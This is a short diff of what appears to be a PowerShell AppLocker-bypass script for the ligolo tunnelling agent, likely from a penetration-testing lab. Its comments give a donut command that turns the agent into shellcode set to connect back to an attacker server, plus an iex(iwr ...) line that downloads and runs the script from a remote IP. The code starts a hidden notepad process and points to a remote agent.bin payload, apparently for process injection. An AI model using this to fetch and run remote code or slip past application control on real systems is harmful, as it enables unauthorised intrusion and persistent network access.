@@ -1,8 +1,7 @@
 #1 Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
 #2 Make sure you are running as x64 bit process before running.
-#3 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
-#4 Run before invoke: "taskkill /F /IM:notepad.exe" before trying again.
-#5 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
+#3 Run before invoke: taskkill /F /IM:notepad.exe 
+#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
 
 Start-Process notepad.exe -WindowStyle Hidden
 $url = "http://192.168.45.223/agent.bin"
